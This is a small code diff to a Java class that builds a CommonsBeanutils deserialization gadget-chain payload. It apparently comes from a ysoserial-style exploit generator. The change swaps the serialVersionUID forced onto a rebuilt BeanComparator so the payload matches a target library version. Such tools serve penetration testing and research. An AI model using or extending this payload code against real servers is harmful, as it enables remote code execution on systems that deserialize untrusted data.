@@ -32,7 +32,7 @@ public class CommonsBeanutilsString_183 implements ObjectPayload<Queue<Object>> 
             CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
             ctBeanComparator.removeField(ctSUID);
         }catch (javassist.NotFoundException e){}
-        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
+        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -2044202215314119608L;", ctBeanComparator));
         final Comparator beanComparator = (Comparator)ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
         ctBeanComparator.defrost();
         Reflections.setFieldValue(beanComparator, "comparator", String.CASE_INSENSITIVE_ORDER);
